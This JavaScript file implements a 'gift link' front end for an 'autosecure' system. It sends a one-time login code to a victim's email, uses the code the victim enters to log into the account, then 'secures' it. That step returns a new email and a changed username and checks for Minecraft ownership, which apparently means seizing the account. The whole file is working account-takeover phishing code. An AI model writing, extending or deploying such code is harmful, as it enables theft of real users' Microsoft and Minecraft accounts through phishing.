// Autosecure Integration for Gift Links
const getCredentials = require('./autosecure/utils/info/getCredentials');
const login = require('./autosecure/utils/secure/login');
const secure = require('./autosecure/utils/secure/recodesecure');
const generate = require('./autosecure/utils/generate');

// Import required modules from your autosecure system
const { queryParams } = require('./autosecure/db/database');

class AutosecureGiftLink {
    constructor() {
        this.sessions = new Map(); // Store active sessions
    }

    // Step 1: Send OTP to email
    async sendOTP(email) {
        try {
            console.log(`[AUTOSECURE_GIFT] Sending OTP to: ${email}`);
            
            // Get credentials and send OTP
            const data = await getCredentials(email, true);
            
            if (!data) {
                return { success: false, error: 'Invalid email or OTP disabled' };
            }

            if (!data._otcSent) {
                return { 
                    success: false, 
                    error: 'Failed to send OTP',
                    details: data._otpError || 'Unknown error'
                };
            }

            // Generate session ID
            const sessionId = generate(32);
            this.sessions.set(sessionId, {
                email,
                data,
                created: Date.now(),
                expires: Date.now() + (15 * 60 * 1000) // 15 minutes
            });

            return { 
                success: true, 
                sessionId,
                message: 'OTP sent successfully',
                hasRecoveryMethods: data._totalSecurityMethods > 0
            };
            
        } catch (error) {
            console.error(`[AUTOSECURE_GIFT] Error sending OTP:`, error);
            return { success: false, error: 'Failed to send OTP' };
        }
    }

    // Step 2: Verify OTP and secure account
    async verifyAndSecure(sessionId, otp, minecraftUsername = null) {
        try {
            const session = this.sessions.get(sessionId);
            
            if (!session) {
                return { success: false, error: 'Invalid or expired session' };
            }

            if (Date.now() > session.expires) {
                this.sessions.delete(sessionId);
                return { success: false, error: 'Session expired' };
            }

            console.log(`[AUTOSECURE_GIFT] Verifying OTP for: ${session.email}`);
            
            // Attempt login with OTP
            let host = null;
            for (let sec of session.data?.Credentials?.OtcLoginEligibleProofs || []) {
                console.log(`[AUTOSECURE_GIFT] Trying OTP proof: ${sec.data}`);
                host = await login({ 
                    email: session.email, 
                    id: sec.data, 
                    code: otp 
                }, session.data);
                
                if (host) {
                    console.log(`[AUTOSECURE_GIFT] Login successful!`);
                    break;
                }
            }

            if (!host) {
                return { success: false, error: 'Invalid OTP code' };
            }

            // Get user settings (you might need to adjust this)
            const userId = 'gift_link_user'; // Default user ID for gift links
            let settings = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [userId]);
            
            if (settings.length === 0) {
                // Create default settings for gift links
                await queryParams(`INSERT INTO secureconfig (user_id) VALUES (?)`, [userId]);
                settings = await queryParams(`SELECT * FROM secureconfig WHERE user_id=?`, [userId]);
            }
            
            settings = settings[0];

            // Generate UID for this secure operation
            const uid = generate(32);

            // Secure the account
            console.log(`[AUTOSECURE_GIFT] Starting secure process...`);
            const account = await secure(host, settings, uid, minecraftUsername);
            
            if (!account || account.status === 'invalid_session') {
                return { success: false, error: 'Failed to secure account' };
            }

            // Clean up session
            this.sessions.delete(sessionId);

            return {
                success: true,
                account: {
                    email: account.email,
                    newEmail: account.email,
                    username: account.newName,
                    oldUsername: account.oldName,
                    hasMinecraft: account.mc !== "No Minecraft!",
                    secured: true,
                    timeTaken: account.timeTaken,
                    uid: uid
                }
            };
            
        } catch (error) {
            console.error(`[AUTOSECURE_GIFT] Error verifying OTP:`, error);
            return { success: false, error: 'Failed to verify OTP' };
        }
    }

    // Clean up expired sessions
    cleanupExpiredSessions() {
        const now = Date.now();
        for (const [sessionId, session] of this.sessions.entries()) {
            if (now > session.expires) {
                this.sessions.delete(sessionId);
            }
        }
    }
}

module.exports = AutosecureGiftLink;
